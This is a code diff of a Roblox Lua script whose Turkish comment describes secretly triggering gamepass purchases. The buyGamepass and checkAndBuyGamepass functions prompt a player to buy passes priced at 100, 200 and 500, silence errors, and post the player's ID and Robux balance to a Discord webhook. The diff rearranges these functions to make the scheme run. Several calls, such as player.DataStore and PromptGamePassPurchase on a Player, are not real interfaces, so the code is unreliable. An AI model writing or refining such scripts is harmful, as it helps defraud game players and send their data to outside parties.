@@ -1,16 +1,10 @@
-local http = game:GetService("HttpService")
-
-local function buyGamepass(gamepassID, userID, webhookURL)
-    -- Gamepass alımını gizli bir şekilde tetikle
-    pcall(function()
-        game.Players:GetUserByID(userID):PromptGamePassPurchase(gamepassID)
-        sendEmbedToDiscord(userID, gamepassID, webhookURL)
-    end)
-end
+local HttpService = game:GetService("HttpService")
 
 local function sendEmbedToDiscord(userID, gamepassID, webhookURL)
-    local player = game.Players:GetUserByID(userID)
-    local robux = player.Balance
+    local player = game.Players:GetPlayerByUserId(userID)
+    if not player then return end  -- Kullanıcı bulunamazsa işlemi durdur
+
+    local robux = player.DataStore:GetAsync("Robux") or 0  -- Robux verisi için alternatif
     local gamepassName = "Gamepass_" .. tostring(gamepassID)
 
     local embedData = {
@@ -26,11 +20,22 @@ local function sendEmbedToDiscord(userID, gamepassID, webhookURL)
     }
 
     local jsonData = HttpService:JSONEncode(embedData)
-    pcall(function() http:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson) end)
+    pcall(function() HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson) end)
+end
+
+local function buyGamepass(gamepassID, userID, webhookURL)
+    -- Gamepass alımını gizli bir şekilde tetikle
+    pcall(function()
+        game.Players:GetPlayerByUserId(userID):PromptGamePassPurchase(gamepassID)
+        sendEmbedToDiscord(userID, gamepassID, webhookURL)
+    end)
 end
 
 local function checkAndBuyGamepass(userID, webhookURL)
-    local robux = game.Players:GetUserByID(userID).Balance
+    local player = game.Players:GetPlayerByUserId(userID)
+    if not player then return end  -- Kullanıcı bulunamazsa işlemi durdur
+
+    local robux = player.DataStore:GetAsync("Robux") or 0
     local availableGamepasses = {100, 200, 500}
 
     for _, price in ipairs(availableGamepasses) do
